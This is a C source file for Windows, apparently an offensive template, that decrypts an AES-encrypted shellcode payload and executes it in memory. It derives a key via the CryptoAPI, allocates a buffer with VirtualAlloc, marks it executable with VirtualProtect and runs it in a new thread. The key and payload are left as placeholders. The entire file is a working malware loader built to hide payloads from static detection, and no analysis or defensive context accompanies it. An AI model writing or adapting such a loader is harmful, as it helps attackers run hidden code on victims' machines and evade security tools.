#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>

int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}


int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	char key[] = { <KEY> };
	unsigned char payl[] = { <AES PAYLOAD> };
	unsigned int len = sizeof(payl);
	
	// Allocate memory for payload
	exec_mem = VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Decrypt payload
	AESDecrypt((char *) payl, len, key, sizeof(key));
	
	// Copy payload to allocated buffer
	RtlMoveMemory(exec_mem, payl, len);
	
	// Set the buffer executable
	rv = VirtualProtect(exec_mem, len, PAGE_EXECUTE_READ, &oldprotect);

	// Run the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}